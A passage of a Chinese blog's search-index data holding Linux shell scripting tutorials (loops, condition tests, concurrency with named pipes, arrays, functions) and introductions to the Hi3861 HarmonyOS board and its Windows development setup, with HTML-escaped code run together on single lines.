循环主要用于确定次数的循环 第一种 for 循环的语法结构如下所示： 1234for 变量名 in 取值列表do 循环体done for 循环语句实现批量主机 ping 探测 1234567891011121314[root@hdp-1 shell]# cat for_ping.sh #!/bin/bashfor name in baidu 163 hao123do &#123; host=www.$name.com ping -c1 -w1 $host &amp;&gt; /dev/null if [ $? -eq 0 ];then echo &quot;$host&quot; | tee -a host.txt fi &#125;&amp;donewaitecho &quot;Mission Completed.&quot; for 循环语句实现文件中批量用户创建 1234567891011121314151617181920[root@hdp-1 shell]# cat users_from_file.sh IFS=$&#x27;\\n&#x27;for line in `cat $1`doif [ $&#123;#line&#125; -eq 0 ];thencontinuefiuser=`echo &quot;$line&quot; | awk &#x27;&#123;print $1&#125;&#x27;`pass=`echo &quot;$line&quot; | awk &#x27;&#123;print $2&#125;&#x27;`id $user &amp;&gt;/dev/nuilif [ $? -eq 0 ] ;thenecho &quot;user $user already exists&quot;elseuseradd $userecho &quot;$pass&quot; | passwd --stdin $user &amp;&gt; /dev/nullif [ $? -eq 0 ];thenecho &quot;$user created&quot;fifidone # while 循环语句语法结构 while 循环语句的基本语法为： 1234while 条件测试do 循环体done while 循环语句会对条件测试进行判断，如果条件测试成立时，则执行 do 和 done 之间的循环体，直到条件测试不成立才停止循环。 while 循环语句实现批量用户创建 1234567891011121314151617181920212223[root@hdp-1 shell]# cat while_user.sh #!/bin/bashwhile read linedo if [ $&#123;#line&#125; -eq 0 ];then echo &quot;NULL&quot; continue fi user=`echo $line | awk &#x27;&#123;print $1&#125;&#x27;` pass=`echo $line | awk &#x27;&#123;print $2&#125;&#x27;` id $user &amp;&gt;/dev/null if [ $? -eq 0 ];then echo &quot;user $user already exists.&quot; else useradd $user echo &quot;$pass&quot;| passwd --stdin $user &amp;&gt;/dev/null if [ $? -eq 0 ] ;then echo &quot;$user created .&quot; fi fidone &lt; $1 # until 循环语句语法结构 until 循环语句基本语法为： 1234until 条件测试do 循环体done until 循环语句是在条件表达式不成立时，进入循环体执行指令，条件表达式成立时，终止循环。until 的应用场景很罕见。 until 循环语句测试远程主机可达性 12345678910[root@hdp-1 shell]# cat until_ping.sh #!/bin/bashhost=www.baidu.comuntil ping -c1 -w1 $host &amp;&gt;/dev/nulldo sleep 1doneecho &quot;$host up. &quot;","categories":[{"name":"平台","slug":"平台","permalink":"http://example.com/categories/%E5%B9%B3%E5%8F%B0/"}],"tags":[{"name":"Shell","slug":"Shell","permalink":"http://example.com/tags/Shell/"}]},{"title":"Linux Shell条件测试","slug":"Linux Shell/Linux Shell条件测试","date":"2021-09-14T00:19:12.000Z","updated":"2021-12-06T07:34:19.018Z","comments":true,"path":"2021/09/14/Linux Shell/Linux Shell条件测试/","link":"","permalink":"http://example.com/2021/09/14/Linux%20Shell/Linux%20Shell%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95/","excerpt":"","text":"# 2 Shell 条件测试 # 2.1 文件测试 在 Shell 编程中，通常使用 test 命令进行条件测试 语法形式为 “test &lt; 测试表达式&gt;”。 123456[root@hdp-1 ~]# test -d /home[root@hdp-1 ~]# echo $?0[root@hdp-1 ~]# test -d /homo[root@hdp-1 ~]# echo $?1 test 条件测试在脚本中的应用 1234567891011[root@hdp-1 shell]# cat test_mysqlback.sh #!/usr/bin/bashback_dir=~/mysql_backif ! test -d $back_dir;then mkdir -p $back_dirfiecho &quot;开始备份...&quot;[root@hdp-1 shell]# chmod +x test_mysqlback.sh [root@hdp-1 shell]# bash -vx test_mysqlback.sh 除 test 外，还可以使用中括号或双中括号进行条件测试 中括号 [ 是 Shell 的内置命令，不是标点符号 1234567891011[root@hdp-1 shell]# [ -d /home ][root@hdp-1 shell]# echo $?0[root@hdp-1 shell]# [ -d /homo ][root@hdp-1 shell]# echo $?1[root@hdp-1 shell]# type -a [[ 是 shell 内嵌[ 是 /usr/bin/[[root@hdp-1 shell]# [[ -d /home ]];echo $?0 文件测试操作符 操作 描述 -d 测试是否为目录 (Directory) -a 测试目录或文件是否存在 (Exist） -f 测试是否为文件 (File) -r 测试当前用户是否可读（read) -w 测试当前用户是否可写 (write） -x 测试当前用户是否可执行（cxcutc） 12345678910111213[root@hdp-1 shell]# ll host.txt -rw-r--r--. 1 root root 102 11月 2 15:41 host.txt[root@hdp-1 shell]# [ -r host.txt ];echo $?0[root@hdp-1 shell]# chmod -r host.txt [root@hdp-1 shell]# ll host.txt --w-------. 1 root root 102 11月 2 15:41 host.txt[root@hdp-1 shell]# [ -r host.txt ];echo $?0[root@hdp-1 shell]# [ -w host.txt ];echo $?0[root@hdp-1 shell]# [ -x host.txt ];echo $?1 # 2.2 整数测试 整数测试通常用于数值之间的运算，其语法格式为 [整数 1 操作符 整数 2] 或 test 整数 1 操作符 整数 2。 操作符 含义 -eq 等于（Equal） -ne 不等于 (Not Equal) -gt 大于 (Greater Than) -lt 小于 (Lesser Than) -le 小于或等于 (Lesser or Equal) -ge 大于或等于 (Greater or Equal) 整数测试在脚本中的应用：创建新用户 123456789101112[root@hdp-1 shell]# cat create_user01.sh #!/bin/bashread -p &quot;Input a username: &quot; userid $user &amp;&gt;/dev/nullif [ $? -eq 0 ];then echo &quot;user $user already exsits.&quot;else useradd $user if [ $? -eq 0 ];then echo &quot;$user created.&quot; fifi 整数测试在脚本中的应用：磁盘可用空间告警 123456789[root@hdp-1 shell]# cat disk_use.sh #!/bin/bash. /etc/profiledisk_use=`df -Th |grep &#x27;/$&#x27;|awk &#x27;&#123;print $(NF-1)&#125;&#x27;|awk -F&quot;%&quot; &#x27;&#123;print $1&#125;&#x27;`if [ $disk_use -ge 5 ];then echo &quot;`date +%F&quot; &quot;%T` disk used: $&#123;disk_use&#125;%&quot;fi[root@hdp-1 shell]# ./disk_use.sh 2021-12-06 14:53:46 disk used: 42% 整数测试在脚本中的应用：内存可用空间告警 shell 语法检查：bash -n xxx.sh 123456789101112[root@hdp-1 shell]# cat mem_use.sh #!/bin/bashmem_used=`free -m |grep &#x27;^M&#x27; |awk &#x27;&#123;print $3&#125;&#x27;`mem_total=`free -m |grep &#x27;^M&#x27; |awk &#x27;&#123;print $2&#125;&#x27;`mem_percent=$[mem_used*100/mem_total]var_file=`date +%F`.logif [ $mem_percent -ge 10 ];then echo &quot;`date +%F&quot; &quot;%T` memory used: $&#123;mem_percent&#125;%&quot; &gt;$var_filefi[root@hdp-1 shell]# ./mem_use.sh [root@hdp-1 shell]# cat 2021-12-06.log 2021-12-06 14:54:44 memory used: 79% # 2.3 字符串测试 字符串测试操作符的作用包括比较字符串是否相同、测试字符串的长度是否为 0。书写表达式为 [字符串 1 = 字符串 2]、[ 字符串 1 ！= 字符串 2 ] 或 [ -z 字符串 ]。字符串测试运算符如表所示。 符号 含义 -z 判断字符串长度是否为 0 -n 判断字符串长度是否为非 0 ! 判断两个字符串是否不相等 = 判断两个字符串是否相等 123456[root@hdp-1 shell]# [ $USER = root ];echo $?0[root@hdp-1 shell]# [ $USER = hadoop ];echo $?1[root@hdp-1 shell]# [ $USER != hadoop ];echo $?0 双引号的作用 1234567891011[root@hdp-1 shell]# [ &quot;$USER&quot; != hadoop ];echo $?0[root@hdp-1 shell]# [ &quot;$USER&quot; = root ];echo $?0[root@hdp-1 shell]# echo $username[root@hdp-1 shell]# [ $username = root ];echo $?-bash: [: =: 期待一元表达式2[root@hdp-1 shell]# [ &quot;$username&quot; = root ];echo $?1 字符串长度测试：空串、未定义变量的长度都是 0 字符串必须使用双引号 1234567891011[root@hdp-1 shell]# var=&quot;&quot;[root@hdp-1 shell]# echo $&#123;#var&#125;0[root@hdp-1 shell]# [ -z $var ];echo $?0[root@hdp-1 shell]# [ -n $var ];echo $?0[root@hdp-1 shell]# [ -z &quot;$var&quot; ];echo $?0[root@hdp-1 shell]# [ -n &quot;$var&quot; ];echo $?1 字符串测试在脚本中的应用 12345678[root@hdp-1 shell]# cat install.sh #!/bin/bashif [ $user ! = root ];then echo &quot;Permission Denied&quot; exitfiyum install httpd 以上是安装服务的脚本，判断变量 user 的值是否为 root，如果为 root 则安装 httpd， 如果不是 root，则显示” 你没有权限”。 # 2.4 逻辑运算符 在 Shell 条件测试中，使用逻辑运算符实现复杂的条件测试，逻辑运算符用于操作两个变量。逻辑运算符语法格式。 123[ 表达式1 ] 操作符 [ 表达式2 ]or命令1 操作符 命令2 逻辑操作符 运算符 含义 -a 或 &amp;&amp; 判断操作符两边均为真，结果为真，否则为假，” 逻辑与” -o 或 || 判断操作符两边一边为真，结果为真，否则为假，” 逻辑或” ! 判断操作符两边均为假，结果为真，否则为假，” 逻辑否” -a 和 &amp;&amp; 的运算规则。 123456789[root@hdp-1 shell]# [ 1 -lt 2 -a 5 -gt 10 ];echo $?1[root@hdp-1 shell]# [ 1 -lt 2 -o 5 -gt 10 ];echo $?0[root@hdp-1 shell]# [[ 1 -lt 2 &amp;&amp; 5 -gt 10 ]];echo $?1[root@hdp-1 shell]# [[ 1 -lt 2 || 5 -gt 10 ]];echo $?0[root@hdp-1 shell]# 应用：创建批量用户 123456789101112[root@hdp-1 shell]# cat user_add.sh #!/bin/bashread -p &quot;Please input a username: &quot; userid $user &amp;&gt;/dev/nullif [ $? -eq 0 ];then echo &quot;user $user already exists.&quot;else useradd $user if [ $? -eq 0 ];then echo &quot;user created.&quot; fifi 应用：创建批量用户 # case 条件语句 case 条件语句相当于多分支的 if/elif/else 条件语句 case 条件语句比 if 语句更加简洁工整，故常应用在实现系统服务启动脚本等应用场景中。 在 Shell 编程中，case 语句有固定的语法格式。其语法格式为： 12345678910111213case 变量值 in 条件表达式1） 代码块1 ；； 条件表达式2） 代码块2 ；； 条件表达式3） 代码块3 ；； *） 默认代码块esac 条件表达式匹配如表所示。 条件表达式 说明 * 任意字符 ? 任意单个字符 [abc] 其中之一 [a-z] 区间之一 | 多重选择 case 条件语句案例实战 123456789101112131415161718192021[root@hdp-1 shell]# cat user_del.sh #!/bin/bash# delete userread -p &quot;Input a username: &quot; userid $user &amp;&gt;/dev/nullif [ $? -ne 0 ];then echo &quot;no such user: $user&quot; exit 1firead -p &quot;Are you sure?[y/n]: &quot; actioncase &quot;$action&quot; iny|Y|yes|YES) userdel -r $user echo &quot;user $user deleted. &quot; ;;*) echo &quot;error! &quot; exit 2esac","categories":[{"name":"平台","slug":"平台","permalink":"http://example.com/categories/%E5%B9%B3%E5%8F%B0/"}],"tags":[{"name":"Shell","slug":"Shell","permalink":"http://example.com/tags/Shell/"}]},{"title":"Linux Shell进阶","slug":"Linux Shell/Linux Shell进阶","date":"2021-09-14T00:19:12.000Z","updated":"2021-12-07T00:35:28.218Z","comments":true,"path":"2021/09/14/Linux Shell/Linux Shell进阶/","link":"","permalink":"http://example.com/2021/09/14/Linux%20Shell/Linux%20Shell%E8%BF%9B%E9%98%B6/","excerpt":"","text":"# 4 并发控制 默认情况下，Shell 命令是串行方式自上而下执行的，但如果有大量的命令需要执行，串行就会浪费大量的时间，这就需要采用并发执行。 # 4.1 利用后台执行实现并发 12345678910111213141516[root@hdp-1 shell]# cat back_ping.sh #!/bin/bashfor i in &#123;1..254&#125;do &#123; ip=10.10.10.$i ping -c1 -w1 $ip &amp;&gt; /dev/null if [ $? -eq 0 ];then echo &quot;$ip is up.&quot; else echo &quot;$ip is down.&quot; fi &#125;&amp;donewaitecho &quot;Mission Completed&quot; # 利用管道实现并发控制 使用 Linux 管道文件特性制作队列，可以控制并发数量。 管道分为命名管道和匿名管道。 创建命名管道文件命令是 mkfifo 命名管道可跨终端实现数据交换 12345678910111213141516171819202122232425262728[root@hdp-1 shell]# cat 255_ping.sh thread=5tmp_fifofile=/tmp/$$.fifomkfifo $tmp_fifofileexec 8&lt;&gt;$tmp_fifofilerm $tmp_fifofilefor i in `seq $thread`do echo &gt;&amp;8donefor i in &#123;1..254&#125;do read -u 8 &#123; ip=10.0.0.$i ping -c1 -w1 $ip &amp;&gt;/dev/null if [ $? -eq 0 ];then echo &quot;$ip is up.&quot; else echo &quot;$ip is down . &quot; fi echo &gt;&amp;8 &#125;&amp;donewaitexec 8&gt;&amp;-echo &quot;misson completed.&quot; # 5 Shell 数组 # 5.1 Shell 数组的基本概念 用于区分不同元素的编号称为数组下标。 数组的元素有时也称为下标变量。 数组分为普通数组和关联数组 普通数组中的索引是整数，关联数组的数组索引可以用文本。 关联数组使用之前需要声明 关联数组由键值对组成。 # 5.1.1 普通数组 普通数组中：数组元素的索引（下标）从 0 开始编号，获取数组中的元素要利用索引（下标）。索引（下标）可以是算术表达式，其结果必须是一个整数。 普通数组定义。 下标从 0 开始 123[root@hdp-1 shell]# books=(linux shell awk openstack docker)[root@hdp-1 shell]# echo $&#123;books[3]&#125;openstack # 5.1.2 关联数组 关联数组和普通数组所不同的是，它的索引下标可以是任意的整数和字符串。 关联数组定义。eg: info=([name]=tianyun [sex]=male [age]=36 [height]=170 [skill]=cloud) # 5.1.3 数组声明 关联数组需要先声明后使用。 通常情况下 Shell 解释器隐式声明普通数组。 声明普通数组的方法为： 1declare -a array 声明关联数组的方法为： 1declare -A array # 5.2 Shell 数组的定义 在 Linux Shell 中，定义一个数组有多种方法，需要先按照命令规则给数组命名，然后再定义数组的值。数组的定义方法有直接定义数组、下标定义数组、间接定义数组和从文件中读入定义数组，接下来详细介绍定义数组的方法。 # 5.2.1 直接定义数组 直接定义数组是用小括号将变量值括起来赋值给数组变量，每个变量值之间要用空隔进行分隔。 123[root@hdp-1 shell]# books=(linux shell awk openstack docker)[root@hdp-1 shell]# echo $&#123;books[3]&#125;openstack # 5.2.2 下标定义数组 下标定义数组是用小括号将变量值括起来，同时采用键值对的形式赋值。 1array_name=([1]=value1 [2]=value2 [3]=value3 ...) 此种方法为 key-value 键值对的形式，小括号里对应的数字为数组下标，等号后面的内容为下标对应的数组变量的值。 123456[root@hdp-1 shell]# declare -A info[root@hdp-1 shell]# info=([name]=tianyun [sex]=male [age]=36 [height]=170 [skill]=cloud)[root@hdp-1 shell]# echo $&#123;info[name]&#125;tianyun[root@hdp-1 shell]# echo $&#123;info[skill]&#125;cloud # 5.2.3 间接定义数组 间接定义数组是分别通过定义数组的方法来定义。其语法格式为： 1array_name[0]=value1;array_name[1]=value2;array_name[2]=value3 此种方法要求一次赋一个值，比较复杂。具体如下所示。 间接定义数组。 1234567[root@hdp-1 shell]# array[0]=pear[root@hdp-1 shell]# array[1]=apple[root@hdp-1 shell]# array[2]=orange[root@hdp-1 shell]# echo $&#123;array[1]&#125;apple[root@hdp-1 shell]# echo &quot;You are the $&#123;array[1]&#125; of my eye.&quot;You are the apple of my eye. # 5.2.4 从文件中读入定义数组 从文件中读入定义数组是使用命令的输出结果作为数组的内容。其语法格式为： 12345array_name=($&#123;命令&#125;)数组名=($(`变量名`))或者array_name=(`命令`)数组名=(`变量值`) 这种方法要求一次赋多个值。 从文件中读入定义数组。 123[root@hdp-1 shell]# array=(`cat /etc/passwd`)[root@hdp-1 shell]# echo $&#123;array[*]&#125;root:x:0:0:root:/root:/bin/bash # 5.3 Shell 数组的遍历及赋值 # 5.3.1 常见的访问 Shell 数组表达式 表列出了常见访问数组的表达式。 语法 描述 echo $ 访问数组所有索引 echo $ 访问数组所有索引 echo $ 访问数组所有值 echo $ 访问数组所有值 echo $ 统计数组元素个数 echo $ 访问数组中的第一个元素 echo $ 从数组下标 1 开始 echo $ 从数组下标 1 开始，访问两个元素 echo $ 第 #个元素的字符个数 echo $ 第 0 个元素的字符个数 echo $ 显示第 #个元素 echo $ 显示第 0 个与元素 # 5.3.2 while 循环实现 Shell 数组的遍历 以 host 文件的每一行作为数组的一个元素来赋值，并对该数组进行遍历。具体如下所示。 while 循环实现 Shell 数组的遍历。 12345678910111213141516cat array_host_while.sh #!/bin/bashwhile read linedo hosts[++i]=$linedone &lt;/etc/hostsecho &quot;hosts first : $&#123;hosts[1]&#125;&quot;echofor i in $&#123;!hosts[@]&#125;do echo &quot;$i: $&#123;hosts[i]&#125;&quot;done while 读入 /etc/hosts 文件的每一行并把它显示出来，hosts [++i]=line这个表达式完成数组的赋值操作，line这个表达式完成数组的赋值操作，line这个表达式完成数组的赋值操作，{!hosts [@]} 这个表达式获得数组的索引，${hosts [i]} 这个表达式完成了数组的遍历。 执行结果如下： 12345678910[root@hdp-1 shell]# ./array_host_while.sh hosts first : 127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain41: 127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain42: ::1 localhost localhost.localdomain localhost6 localhost6.localdomain63: 4: 172.18.*.* as5: 172.18.*.* hdp-16: 172.18.*.* hdp-27: 172.18.*.* hdp-3 # 5.3.3 for 循环实现 Shell 数组的遍历 当一个脚本需要传入的参数较多时，可以使用 for 循环进行参数遍历。具体如下例所示。 for 循环实现 Shell 数组的遍历。 12345678910111213[root@hdp-1 shell]# cat array_host_for.sh #!/bin/bash#for arrayOLD_IFS=$IFSIFS=$&#x27;\\n&#x27; for line in `cat /etc/hosts`dohosts[++j]=$linedonefor i in $&#123;!hosts[@]&#125;do echo &quot;$i: $&#123;hosts[i]&#125;&quot;done 定义一个数组 hosts 以 /etc/hosts 每一行内容作为数组的元素进行遍历。 执行结果如下： 12345678[root@hdp-1 shell]# ./array_host_for.sh 1: 127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain42: ::1 localhost localhost.localdomain localhost6 localhost6.localdomain63: 4: 172.18.*.* as5: 172.18.*.* hdp-16: 172.18.*.* hdp-27: 172.18.*.* hdp-3 # 6 Shell 函数 # 6.1 Shell 函数的概念 函数是由若干条 Shell 命令组成的语句块，实现代码重用和模块化编程，它不是一个单独的进程，不能独立运行，它只是 Shell 程序的一部分。 Shell 函数和 Shell 程序比较相似，区别在于：Shell 程序在子 Shell 中运行，而 Shell 函数在当前 Shell 中运行，因此在当前 Shell 中，函数可以对 Shell 变量进行修改。 函数可以提高程序的可读性和重用性。 # 6.2 Shell 函数的语法 Shell 函数的语法格式为： 1234567函数名()&#123; 代码块 &#125;orfunction 函数名 &#123; 代码块 &#125; 关键字 function 表示定义一个函数，可以省略，其后是函数名，两个大括号之间是函数体。创建的函数可以在别的脚本中被调用。 # 6.3 Shell 函数的调用 # 6.3.1 Shell 函数的传参介绍 最基本的语法格式为： 1函数名 带有参数的语法格式为： 1函数名 参数1 参数2 Shell 的位置参数（$1、$2、…）可以作为函数的参数来使用。其中，$1 表示第一个参数，$2 表示第二个参数。 当 n≥10 时，需要使用 ${n} 来获取参数。例如，获取第十个参数不能用10，需要用10，需要用10，需要用 {10}。 # 6.4 Shell 函数的应用实战 # 6.4.1 脚本中调用 Shell 函数 函数必须在使用前需要先被定义。因此，在脚本中使用函数时，必须在脚本开始前定义函数，调用函数仅使用函数名即可 1234567891011121314[root@hdp-1 shell]# ./function.sh 5的阶乘是: 120[root@hdp-1 shell]# cat function.sh #!/bin/bashfactorial()&#123; factorial=1 for((i=1;i&lt;=5;i++)) do factorial=$[$factorial * $i] done echo &quot;5的阶乘是: $factorial&quot;&#125;factorial 接下来使用带有可以传参调用的函数来写一个计算阶乘的脚本 1234567891011121314[root@hdp-1 shell]# ./function.sh 55的阶乘是: 120[root@hdp-1 shell]# cat function.sh #!/bin/bashfactorial()&#123; factorial=1 for((i=1;i&lt;=$1;i++)) do factorial=$[$factorial * $i] done echo &quot;5的阶乘是: $factorial&quot;&#125;factorial $1 函数的位置参数与脚本的位置参数 123456789101112131415[root@hdp-1 shell]# ./position_func.sh 2 3 4result is : 24[root@hdp-1 shell]# cat position_func.sh #!/bin/bashif [ $# -ne 3 ];then echo &quot;usage: `basename $0` p1 p2 p3&quot; exitfifun()&#123; echo &quot;$[$1*$2*$3]&quot;&#125;#resultresult=`fun $1 $2 $3`echo &quot;result is : $result&quot; # 6.4.2 Shell 函数的返回值 函数有两种返回值，分别为执行结果的返回值和退出状态码。 函数的退出状态码取决于函数中执行的最后一条命令的退出状态码。 自定义退出状态码的语法格式为： 12return 0 无错误返回return 1-255 有错误返回 退出状态码使用 return 保留字返回 return 的返回值只能是 0~255 的一个整数 执行结果的返回值不使用 return 执行结果的返回值将保存到变量 “$?” 中 函数执行结果的的返回值。 123456789101112[root@hdp-1 shell]# ./return.sh Enter a Number: 3fun2 return value: 0[root@hdp-1 shell]# cat return.sh #!/bin/bashfun2()&#123; read -p &quot;Enter a Number: &quot; num let 2*num&#125;fun2echo &quot;fun2 return value: $?&quot; # 6.4.3 Shell 函数数组变量的传参 向函数中传递数组 12345678910111213141516[root@hdp-1 shell]# ./array_func.sh 120[root@hdp-1 shell]# cat array_func.sh #!/bin/bashnum=(1 2 3 4 5)array()&#123; result=1 for i in &quot;$@&quot; do result=$[$result*$i] done echo &quot;$result&quot;&#125;array $&#123;num[@]&#125;","categories":[{"name":"平台","slug":"平台","permalink":"http://example.com/categories/%E5%B9%B3%E5%8F%B0/"}],"tags":[{"name":"Shell","slug":"Shell","permalink":"http://example.com/tags/Shell/"}]},{"title":"(1)Hi3861开发板介绍","slug":"鸿蒙开发/(1)Hi3861开发板介绍","date":"2021-07-28T00:37:44.000Z","updated":"2021-12-08T08:10:16.229Z","comments":true,"path":"2021/07/28/鸿蒙开发/(1)Hi3861开发板介绍/","link":"","permalink":"http://example.com/2021/07/28/%E9%B8%BF%E8%92%99%E5%BC%80%E5%8F%91/(1)Hi3861%E5%BC%80%E5%8F%91%E6%9D%BF%E4%BB%8B%E7%BB%8D/","excerpt":"","text":"# Hi3861 开发板介绍 更新时间: 2021-07-21 09:12 # 简介 Hi3861 WLAN 模组是一片大约 2cm*5cm 大小的开发板，是一款高度集成的 2.4GHz WLAN SoC 芯片，集成 IEEE 802.11b/g/n 基带和 RF（Radio Frequency）电路。支持 HarmonyOS，并配套提供开放、易用的开发和调试运行环境。 图 1 Hi3861 WLAN 模组外观图 另外，Hi3861 WLAN 模组还可以通过与 Hi3861 底板连接，扩充自身的外设能力，底板如下图所示。 图 2 Hi3861 底板外观图 RF 电路包括功率放大器 PA（Power Amplifier）、低噪声放大器 LNA（Low Noise Amplifier）、RF Balun、天线开关以及电源管理等模块；支持 20MHz 标准带宽和 5MHz/10MHz 窄带宽，提供最大 72.2Mbit/s 物理层速率。 Hi3861 WLAN 基带支持正交频分复用（OFDM）技术，并向下兼容直接序列扩频（DSSS）和补码键控（CCK）技术，支持 IEEE 802.11 b/g/n 协议的各种数据速率。 Hi3861 芯片集成高性能 32bit 微处理器、硬件安全引擎以及丰富的外设接口，外设接口包括 SPI（Synchronous Peripheral Interface）、UART（Universal Asynchronous Receiver &amp; Transmitter）、I2C（The Inter Integrated Circuit）、PWM（Pulse Width Modulation）、GPIO（General Purpose Input/Output）和多路 ADC（Analog to Digital Converter），同时支持高速 SDIO2.0（Secure Digital Input/Output）接口，最高时钟可达 50MHz；芯片内置 SRAM（Static Random Access Memory）和 Flash，可独立运行，并支持在 Flash 上运行程序。 Hi3861 芯片适用于智能家电等物联网智能终端领域。 图 3 Hi3861 功能框图 # 资源和约束 Hi3861 WLAN 模组资源十分有限，整板共 2MB FLASH，352KB RAM。在编写业务代码时，需注意资源使用效率。 # 开发板规格 规格类型 规格清单 通用规格 1×1 2.4GHz 频段（ch1～ch14）PHY 支持 IEEE 802.11b/g/nMAC 支持 IEEE802.11 d/e/h/i/k/v/w 内置 PA 和 LNA，集成 TX/RX Switch、Balun 等支持 STA 和 AP 形态，作为 AP 时最大支持 6 个 STA 接入支持 WFA WPA/WPA2 personal、WPS2.0 支持与 BT/BLE 芯片共存的 2/3/4 线 PTA 方案电源电压输入范围：2.3V～3.6VIO 电源电压支持 1.8V 和 3.3V 支持 RF 自校准方案低功耗：Ultra Deep Sleep 模式：5μA@3.3VDTIM1：1.5mA@3.3VDTIM3：0.8mA@3.3V PHY 特性 支持 IEEE802.11b/g/n 单天线所有的数据速率支持最大速率：72.2Mbps@HT20 MCS7 支持标准 20MHz 带宽和 5M/10M 窄带宽支持 STBC 支持 Short-GI MAC 特性 支持 A-MPDU，A-MSDU 支持 Blk-ACK 支持 QoS，满足不同业务服务质量需求 CPU 子系统 高性能 32bit 微处理器，最大工作频率 160MHz 内嵌 SRAM 352KB、ROM 288KB 内嵌 2MB Flash 外围接口 1 个 SDIO 接口、2 个 SPI 接口、2 个 I2C 接口、3 个 UART 接口、15 个 GPIO 接口、7 路 ADC 输入、6 路 PWM、1 个 I2S 接口（注：上述接口通过复用实现）外部主晶体频率 40M 或 24M 其他信息 封装：QFN-32，5mm×5mm 工作温度：-40℃ ～ +85℃ # HarmonyOS 关键特性 HarmonyOS 基于 Hi3861 平台提供了多种开放能力，提供的关键组件如下表所示。 组件名 能力介绍 WLAN 服务 提供 WLAN 服务能力。包括：station 和 hotspot 模式的连接、断开、状态查询等。 模组外设控制 提供操作外设的能力。包括：I2C、I2S、ADC、UART、SPI、SDIO、GPIO、PWM、FLASH 等。 分布式软总线 在 HarmonyOS 分布式网络中，提供设备被发现、数据传输的能力。 设备安全绑定 提供在设备互联场景中，数据在设备之间的安全流转的能力。 基础加解密 提供密钥管理、加解密等能力。 系统服务管理 系统服务管理基于面向服务的架构，提供了 HarmonyOS 统一化的系统服务开发框架。 启动引导 提供系统服务的启动入口标识。在系统服务管理启动时，调用 boostrap 标识的入口函数，并启动系统服务。 系统属性 提供获取与设置系统属性的能力。 基础库 提供公共基础库能力。包括：文件操作、KV 存储管理等。 DFX 提供 DFX 能力。包括：流水日志、时间打点等。 XTS 提供 HarmonyOS 生态认证测试套件的集合能力。","categories":[{"name":"鸿蒙设备开发(hi3861)","slug":"鸿蒙设备开发-hi3861","permalink":"http://example.com/categories/%E9%B8%BF%E8%92%99%E8%AE%BE%E5%A4%87%E5%BC%80%E5%8F%91-hi3861/"}],"tags":[{"name":"鸿蒙","slug":"鸿蒙","permalink":"http://example.com/tags/%E9%B8%BF%E8%92%99/"},{"name":"单片机","slug":"单片机","permalink":"http://example.com/tags/%E5%8D%95%E7%89%87%E6%9C%BA/"}]},{"title":"(2)Windows开发环境准备","slug":"鸿蒙开发/(2)Windows鸿蒙开发环境准备","date":"2021-07-28T00:37:44.000Z","updated":"2021-07-29T05:19:52.000Z","comments":true,"path":"2021/07/28/鸿蒙开发/(2)Windows鸿蒙开发环境准备/","link":"","permalink":"http://example.com/2021/07/28/%E9%B8%BF%E8%92%99%E5%BC%80%E5%8F%91/(2)Windows%E9%B8%BF%E8%92%99%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/","excerpt":"","text":"# Windows 开发环境准备 更新时间: 2021-07-21 09:12 系统要求：Windows 10 64 位系统。 DevEco Device Tool 以插件方式提供，基于 Visual Studio Code 进行扩展，安装分为如下几步： 安装 Visual Studio Code 安装 Python 安装 Node.js 安装 hpm 安装 DevEco Device Tool 插件 # 获取软件 工具名称 用途说明 版本要求 获取渠道 Visual Studio Code 代码编辑工具 V1.53 及以上 64 位版本。 https://code.visualstudio.com/Download Python 编译构建工具 V3.7.4~V3.8.x 64 位版本 推荐下载：https://www.python.org/downloads/release/python-388/ Node.js 提供 npm 环境 v12.0.0 及以上 64 位版本 https://nodejs.org/zh-cn/download/ hpm 包管理工具 最新版 请参考安装 hpm。 DevEco Device Tool HarmonyOS 源码的编译、烧录、调试插件工具 v2.2 Beta1 https://device.harmonyos.com/cn/ide#download 下载前，请使用华为开发者帐号登录，如未注册，请先注册华为开发者帐号。 # 安装 Visual Studio Code 说明 如果已安装 Visual Studio Code，打开命令行工具，输入 code --version 命令，检查版本号是否为 1.53 及以上版本；可以正常返回版本号，说明环境变量设置也正确。 双击 Visual Studio Code 软件包进行安装。安装过程中，请勾选 “添加到 PATH（重启后生效）”。 安装完成后，重启计算机，使 Visual Studio Code 的环境变量生效。 打开命令行工具，输入 code --version 命令，可以正常显示版本号说明安装成功。 # 安装 Python 双击 Python 安装包进行安装，勾选 “Add Python 3.8 to PATH”，然后点击 Install Now 开始安装。 等待安装完成后，点击 Close。 打开命令行工具，输入 python --version，检查安装结果。 在命令行工具中，分别执行如下命令设置 pip 源，用于后续安装 DevEco Device Tool 过程中下载依赖的组件包。 1pip config set global.trusted-host repo.huaweicloud.compip config set global.index-url https://repo.huaweicloud.com/repository/pypi/simplepip config set global.timeout 120 # 安装 Node.js 说明 如果已安装 Node.js，打开命令行工具，输入 node -v 命令，检查版本号是否为 12.0.0 及以上版本。 点击下载后的软件包进行安装，全部按照默认设置点击 Next，直至 Finish。安装过程中，Node.js 会自动在系统的 path 环境变量中配置 node.exe 的目录路径。 重新打开命令行工具，输入 “node -v” 命令，能正常查询 Node.js 的版本号，说明 Node.js 安装成功。 # 安装 hpm 该方式需先确保 Node.js 安装成功。 在安装 hpm 前，请检查网络连接状态，如果网络不能直接访问 Internet，则需要通过代理服务器才可以访问。这种情况下，需要先设置 npm 代理，才能安装 hpm。 说明 如果已安装 hpm，可以执行 npm update -g @ohos/hpm-cli 命令升级 hpm 至最新版本。 建议将 npm 源配置为国内镜像，例如设置为华为云镜像源。 1npm config set registry https://repo.huaweicloud.com/repository/npm/ 打开命令行工具，执行如下命令安装最新版本 hpm。 1npm install -g @ohos/hpm-cli 安装完成后，执行如下命令（V 为大写字母）检查 hpm 安装结果。 1hpm -V # 安装 DevEco Device Tool 插件 安装 DevEco Device Tool 插件，主机的用户名不能包含中文字符，否则可能导致运行出现错误。 DevEco Device Tool 正常运行需要依赖于 C/C 和 CodeLLDB 插件，在安装完 DevEco Device Tool 后，会自动从 Visual Studio Code 的插件市场安装 C/C 和 CodeLLDB 插件。因此，在安装 DevEco Device Tool 前，请检查 Visual Studio Code 的网络连接状态，如果网络不能直接访问 Internet，则需要通过代理服务器才可以访问，请先 Visual Studio Code 代理设置。 说明 安装 DevEco Device Tool 时，请先关闭 Visual Studio Code。 解压 DevEco Device Tool 